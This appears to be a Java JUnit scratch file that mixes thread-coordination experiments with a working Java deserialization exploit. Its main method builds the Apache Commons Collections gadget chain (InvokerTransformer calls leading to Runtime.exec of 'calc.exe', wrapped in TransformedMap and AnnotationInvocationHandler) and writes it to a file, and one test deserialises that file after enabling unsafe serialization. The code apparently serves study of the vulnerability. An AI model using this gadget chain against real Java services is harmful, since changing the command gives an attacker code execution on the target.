import annotations.TestAnnotation;
import node.TreeNode;
import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.ParameterizedType;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;
import java.util.concurrent.locks.LockSupport;
import java.util.concurrent.locks.ReentrantLock;

@TestAnnotation(mes = "dsad")
public class firstTest {
    private List<Integer> ints = new ArrayList<>();
    private Set<Integer> set = new HashSet();
    private Set<Integer> set1 = new HashSet();
    private static int statuIndex = 0;

    @Test
    public void Deserialize() throws IOException, ClassNotFoundException {
        Properties properties = new Properties();
        properties.put("org.apache.commons.collections.enableUnsafeSerialization", "true");
        System.setProperties(properties);
        File file = new File("temp.sh");
        ObjectInputStream stream = new ObjectInputStream(new FileInputStream(file));
        Object object = stream.readObject();


        System.out.println(object instanceof ParameterizedType);
    }






    @Test
    public void RMI() throws Exception {

        CyclicBarrier cyclicBarrier = new CyclicBarrier(10, () -> {
            System.out.println("我被执行啦");
        });
        CountDownLatch latch = new CountDownLatch(10);
        for (int i = 0; i < 20; i++) {
            new Thread(() -> {
                try {
                    cyclicBarrier.await();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (BrokenBarrierException e) {
                    e.printStackTrace();
                }
                latch.countDown();

            }).start();
        }
        latch.await();
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
        System.out.println(systemClassLoader);


    }


    public static void main(String[] args) throws
            InterruptedException, IllegalAccessException, NoSuchFieldException, IOException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException {
        Properties properties = new Properties();
        properties.put("org.apache.commons.collections.enableUnsafeSerialization", "true");
        System.setProperties(properties);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc.exe"})};
        Transformer transformedChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("1", "zhang");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outerMap);

        File file = new File("temp.sh");
        ObjectOutputStream stream = new ObjectOutputStream(new FileOutputStream(file));
        stream.writeObject(instance);


//        Runtime.getRuntime().exec("notepad.exe");

    }
}